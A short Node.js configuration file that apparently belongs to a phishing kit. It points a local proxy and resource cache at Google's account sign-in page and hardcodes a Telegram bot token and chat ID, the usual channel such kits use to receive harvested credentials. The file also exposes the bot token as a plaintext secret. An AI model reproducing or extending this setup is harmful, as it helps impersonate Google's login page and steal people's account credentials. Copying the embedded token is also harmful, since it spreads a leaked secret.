const path = require('path');

const CACHED_RESOURCES_DIR = path.resolve('cached_resources');
const BASE_URL = 'https://accounts.google.com/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'; 
const PORT = 1000;
const LOCAL_URL = '127.0.0.1';
const SCHEME = 'http'; 

const CONTENT_URL = `${SCHEME}://${LOCAL_URL}:${PORT}/getContent?url=`;

const TELEGRAM_BOT_TOKEN = '7818936324:AAFr4RFwS2IKe2GmAzkPHtYkQjHZyO_vO8w';
const TELEGRAM_CHAT_ID = '-4745200310';

module.exports = {
    CACHED_RESOURCES_DIR,
    BASE_URL,
    CONTENT_URL,
    PORT,
    LOCAL_URL,
    SCHEME,
    TELEGRAM_BOT_TOKEN,
    TELEGRAM_CHAT_ID,
};
